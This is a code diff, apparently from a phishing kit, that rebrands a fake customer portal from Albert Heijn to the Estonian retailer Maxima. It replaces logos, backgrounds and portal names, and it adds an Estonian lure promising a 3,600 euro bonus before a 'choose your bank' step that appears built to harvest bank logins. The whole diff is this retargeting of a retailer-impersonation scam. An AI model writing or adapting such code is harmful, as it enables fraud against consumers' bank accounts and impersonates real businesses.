@@ -55,19 +55,19 @@ type LegacyGlobalSettings = Partial<GlobalSettings> & {
 };
 
 const LEGACY_ALBERT_HEIJN_LOGO_URL = "https://static.ah.nl/ah-static/images/ah-ui-bridge-components/logo/logo-ah.svg";
-const ALBERT_HEIJN_LOGO_URL = "/ah-logo-transparent.png";
-const ALBERT_HEIJN_BG_URL = "/6d4bc8553ef96b6814a98ebe96498b34.webp";
+const MAXIMA_LOGO_URL = "/maxima-logo-transparent.png";
+const MAXIMA_BG_URL = "/maxima-bg-ee.png";
 const LEGACY_BG_URL = "/spar-bg.png";
 const LEGACY_PORTAL_NAME = "Albert Heijn klantenportaal";
 const LEGACY_SUPPORT_CENTER_NAME = "Albert Heijn service";
-const ESTONIAN_SUPPORT_CENTER_NAME = "Albert Heijn Klienditeenindus";
+const ESTONIAN_SUPPORT_CENTER_NAME = "Maxima Klienditeenindus";
 const LEGACY_WIN_TITLE = "Exclusieve Albert Heijn bonus";
 const LEGACY_WIN_SUBTITLE =
   "Gefeliciteerd! Je bent geselecteerd voor onze Albert Heijn actie van vandaag. Klik op de knop hieronder om je bonus van 3.600 euro te claimen.";
-const ESTONIAN_PORTAL_NAME = "Albert Heijn Kliendiportaal";
-const ESTONIAN_WIN_TITLE = "Eksklusiivne Albert Heijn Boonus";
+const ESTONIAN_PORTAL_NAME = "Maxima Kliendiportaal";
+const ESTONIAN_WIN_TITLE = "Eksklusiivne Maxima Boonus";
 const ESTONIAN_WIN_SUBTITLE =
-  "Palju õnne! Olete valitud tänasesse Albert Heijn kampaaniasse. Klõpsake allolevat nuppu, et lunastada oma 3600 euro suurune boonus.";
+  "Palju õnne! Olete valitud tänasesse Maxima kampaaniasse. Klõpsake allolevat nuppu, et lunastada oma 3600 euro suurune boonus.";
 const ESTONIAN_WIN_BUTTON = "Lunasta boonus";
 const ESTONIAN_BANKEN_TITLE = "Vali oma pank";
 const ESTONIAN_BANKEN_SUBTITLE = "Jätkamiseks vali oma pank.";
@@ -129,11 +129,11 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
     next.logo_url === "/logo.png" ||
     next.logo_url === LEGACY_ALBERT_HEIJN_LOGO_URL
   ) {
-    next.logo_url = ALBERT_HEIJN_LOGO_URL;
+    next.logo_url = MAXIMA_LOGO_URL;
   }
 
   if (!next.bg_url || next.bg_url === LEGACY_BG_URL) {
-    next.bg_url = ALBERT_HEIJN_BG_URL;
+    next.bg_url = MAXIMA_BG_URL;
   }
 
   if (!next.portal_name || next.portal_name === LEGACY_PORTAL_NAME) {
@@ -210,8 +210,8 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
 }
 
 export const defaultSettings: GlobalSettings = {
-  logo_url: ALBERT_HEIJN_LOGO_URL,
-  bg_url: ALBERT_HEIJN_BG_URL,
+  logo_url: MAXIMA_LOGO_URL,
+  bg_url: MAXIMA_BG_URL,
   portal_name: ESTONIAN_PORTAL_NAME,
   support_center_name: ESTONIAN_SUPPORT_CENTER_NAME,
   win_title: ESTONIAN_WIN_TITLE,
